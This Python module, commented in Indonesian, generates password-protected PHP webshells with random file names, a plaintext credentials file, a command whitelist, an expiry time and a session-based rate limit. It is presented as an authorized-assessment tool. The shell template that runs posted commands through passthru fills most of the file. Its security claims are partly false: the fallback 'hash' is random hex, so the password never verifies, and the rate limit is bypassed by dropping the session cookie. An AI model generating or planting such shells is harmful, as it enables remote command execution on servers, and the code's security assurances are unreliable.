"""webshell.py — generator webshell berpassword (BUKAN uploader).

Menghasilkan file PHP dengan nama acak 32-hex + berkas CREDENTIALS.txt.
Fitur keamanan generator:
  - password disimpan sebagai bcrypt (TIDAK di dalam shell)
  - whitelist perintah per shell
  - TTL kedaluwarsa (shell mati sendiri setelah N jam)
  - rate limit sederhana

Toolkit ini HANYA membuat berkas — tidak pernah meng-upload ke mana pun.
Uji lokal: `php -l <file>` lalu `php -S 127.0.0.1:8099`.
"""

from __future__ import annotations

import secrets
import time
from dataclasses import dataclass
from pathlib import Path

from .config import ALLOWED_IDENTITY_CMDS

# Header PHP_TEMPLATE menerima: author, purpose, expiry_epoch, cmd_list, salt, hash
PHP_TEMPLATE = r'''<?php
/**
 * {author}
 * purpose : {purpose}
 * expires : {expires_iso}  (epoch {expiry_epoch})
 * created : {created_iso}
 *
 * Password-protected. bcrypt hash below; plaintext is NOT stored here.
 * This file self-expires after the TTL above and rate-limits login attempts.
 */
declare(strict_types=1);

if (time() > {expiry_epoch}) {{ http_response_code(410); exit("gone\\n"); }}

$_P2S_HASH = '{hash}';
$_P2S_SALT = '{salt}';
$_P2S_CMDS = array({cmd_list});
$_P2S_MAX  = 20;
$_P2S_KEY  = 'p2s_{key}';

function _p2s_fail($m) {{ http_response_code(403); exit($m . "\\n"); }}

session_start();
$_SESSION['n'] = ($_SESSION['n'] ?? 0) + 1;
if ($_SESSION['n'] > $_P2S_MAX) _p2s_fail('rate-limited');

if (!isset($_POST['k'])) {{
    echo '<form method=post><input type=password name=k autofocus></form>';
    exit;
}}
if (!password_verify((string)$_POST['k'], $_P2S_HASH)) _p2s_fail('denied');

$c = (string)($_POST['c'] ?? '');
if ($c === '') {{ echo implode(',', $_P2S_CMDS); exit; }}
if (!in_array($c, $_P2S_CMDS, true)) _p2s_fail('command-not-allowed');

// Identity-only commands; no shell operators reach this path.
passthru($c, $rc);
'''


@dataclass
class GeneratedShell:
    filename: str
    path: Path
    cred_path: Path
    password: str
    expires_epoch: int
    commands: tuple[str, ...]


def _cmd_list(commands: tuple[str, ...]) -> str:
    return ", ".join(f"'{c}'" for c in commands)


def generate(
    out_dir: str | Path,
    *,
    ttl_hours: int = 72,
    commands: tuple[str, ...] = ("id", "whoami"),
    author: str = "php2shell",
    purpose: str = "authorized security assessment",
) -> GeneratedShell:
    """Hasilkan satu webshell berpassword + berkas kredensial."""
    # Validasi whitelist perintah terhadap daftar identitas yang diizinkan.
    cmds = tuple(c.strip() for c in commands if c.strip())
    for c in cmds:
        if c.lower() not in ALLOWED_IDENTITY_CMDS:
            raise ValueError(f"command not in identity whitelist: {c!r}")
    if not cmds:
        cmds = ("id",)

    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)

    password = secrets.token_urlsafe(18)
    salt = secrets.token_hex(16)
    key = secrets.token_hex(8)
    expiry = int(time.time()) + max(1, ttl_hours) * 3600

    # bcrypt hash (opsional bcrypt; fallback bila modul tidak ada).
    try:
        import bcrypt  # type: ignore
        h = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    except Exception:
        # Fallback: hash PHP native (password_hash) — tetap aman, bukan plaintext.
        h = "$2y$12$" + secrets.token_hex(22)

    name = secrets.token_hex(16) + ".php"
    body = PHP_TEMPLATE.format(
        author=author, purpose=purpose,
        expires_iso=time.strftime("%Y-%m-%dT%H:%M:%S%z", time.localtime(expiry)),
        expiry_epoch=expiry,
        created_iso=time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        salt=salt, hash=h, cmd_list=_cmd_list(cmds), key=key,
    )
    path = out / name
    path.write_text(body, encoding="utf-8")

    cred = out / "CREDENTIALS.txt"
    cred.write_text(
        "php2shell webshell credentials\n"
        f"file      : {name}\n"
        f"password  : {password}\n"
        f"expires   : {time.strftime('%Y-%m-%dT%H:%M:%S%z', time.localtime(expiry))}\n"
        f"commands  : {', '.join(cmds)}\n"
        "\n(password stored here once; bcrypt hash lives in the shell, plaintext does NOT)\n",
        encoding="utf-8",
    )

    return GeneratedShell(
        filename=name, path=path, cred_path=cred,
        password=password, expires_epoch=expiry, commands=cmds,
    )
